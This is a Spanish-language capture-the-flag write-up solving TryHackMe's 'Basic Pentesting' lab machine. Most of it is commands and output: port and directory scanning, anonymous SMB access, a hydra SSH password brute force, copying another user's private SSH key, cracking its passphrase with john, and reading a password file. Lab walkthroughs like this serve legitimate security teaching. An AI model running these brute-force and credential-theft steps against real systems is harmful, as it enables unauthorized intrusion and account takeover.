# Resolución de la Máquina: Basic Pentesting

- **Plataforma:** TryHackMe
- **Dificultad:** Fácil
- **Fecha de resolución:** 18/06/2025
- **Sistema Operativo:** Linux


## Descripción

"Basic Pentesting" es una máquina de nivel fácil alojada en TryHackMe, diseñada para quienes están comenzando en el ámbito del hacking ético y pruebas de penetración en entornos reales simulados. Su enfoque está en vectores de ataque comunes en entornos empresariales, especialmente la enumeración y el uso de credenciales débiles o mal configuradas.

Durante la resolución, el atacante debe realizar una serie de pasos de reconocimiento y enumeración para identificar servicios expuestos, acceder a través de credenciales por defecto o fuerza bruta, y finalmente escalar privilegios para obtener el control total del sistema.

Esta máquina es especialmente útil para:

> Practicar la enumeración de puertos y servicios mediante herramientas como Nmap

> Realizar fuerza bruta sobre servicios como SSH o SMB para obtener acceso inicial

> Explorar comparticiones de red y archivos accesibles con credenciales débiles

> Reforzar técnicas básicas de escalada de privilegios en sistemas Linux


## Enumeración

### Escaneo con Nmap

```bash
└─$ nmap --open -sS -T5 -sV -n -Pn 10.10.40.29
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-18 19:02 CEST
Nmap scan report for 10.10.40.29
Host is up (0.052s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.18 seconds
```
Al acceder por el puerto 80 veremos que la web esta en mantenimiento, pero inspeccionando el código fuente veremos lo siguiente:

```html
<html>

<h1>Undergoing maintenance</h1>

<h4>Please check back later</h4>

<!-- Check our dev note section if you need to know what to work on. -->


</html>
```
### Escaneo con gobuster
```bash
└─$ gobuster dir -u http://10.10.40.29 -w /usr/share/wordlists/wfuzz/general/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.40.29
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/wfuzz/general/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 316] [--> http://10.10.40.29/development/]
Progress: 952 / 953 (99.90%)
===============================================================
Finished
===============================================================
```

### Instrusión al sistema
Accediendo de /development veremos los siguientes txt
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
Si tratamos de acceder a SMB veremos que podemos listar diversos shares sin necesidad de autenticarnos.

```bash
└─$ smbclient -L //10.10.40.29/Anonymous -N

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2

```
Veremos que podremos acceder a Anonymous, dentro veremos un txt que traeremos a nuestra máquina con un get.
```bash
└─$ smbclient //10.10.40.29/Anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 19:31:20 2018
  ..                                  D        0  Thu Apr 19 19:13:06 2018
  staff.txt                           N      173  Thu Apr 19 19:29:55 2018

                14318640 blocks of size 1024. 11094772 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0,4 KiloBytes/sec) (average 0,4 KiloBytes/sec)
smb: \> 
```
```
PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```
Con esto podemos deducir que en el sistema se encuentran el usuario Kay y Jan, mediante un ataque de fuerza bruta con hydra obtendremos la contraseña de Jan.
```bash
└─$ hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.221.79 ssh                       
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-19 19:10:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.221.79:22/
[STATUS] 290.00 tries/min, 290 tries in 00:01h, 14344112 to do in 824:23h, 13 active
[22][ssh] host: 10.10.221.79   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-19 19:13:13
```
Una vez dentro del usuario veremos que en /home/kay podemos encontrar un archivo llamado pass.bak al que solo kay puede acceder, por lo tanto, hemos de buscar la manera de escalar privilegios y ser Kay.

SSH permite la autenticación basada en clave pública y privada, usando el algoritmo RSA. El cliente prueba su identidad demostrando que posee una clave privada (id_rsa) asociada a una clave pública previamente autorizada en el servidor.
Nosotros lo que haremos sera obtener la clave privada de Kay y nos haremos pasar por el, de esta manera podremos acceder sin la contraseña.

Nos pasaremos la clave pública con un scp
```bash
└─$ scp jan@10.10.221.79:/home/kay/.ssh/id_rsa .
jan@10.10.221.79's password: 
id_rsa                                                                             100% 3326    34.8KB/s   00:00    
```
A este archivo le deberemos dar permisos 600, pero en el momento de su ejecución nos encontramos con que la clave privada esta cifrada
```bash
└─$ chmod 600 id_rsa 
                                                                                                                     
┌──(yeray㉿kali)-[~]
└─$ ssh -i id_rsa kay@10.10.221.79             
Enter passphrase for key 'id_rsa': 
kay@10.10.221.79's password:
```
Hashearemos el archivo id_rsa utilizando el sigueinte comando
```bash
└─$ ssh2john id_rsa > id_rsa.hash
```
Y posteriormente pasaremos este hash por un diccionario
```bash
└─$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2025-06-19 19:46) 4.347g/s 359686p/s 359686c/s 359686C/s betzabeth..beba21
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Ahora ya podremos visualizar el contenido de pass.bak
```bash
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
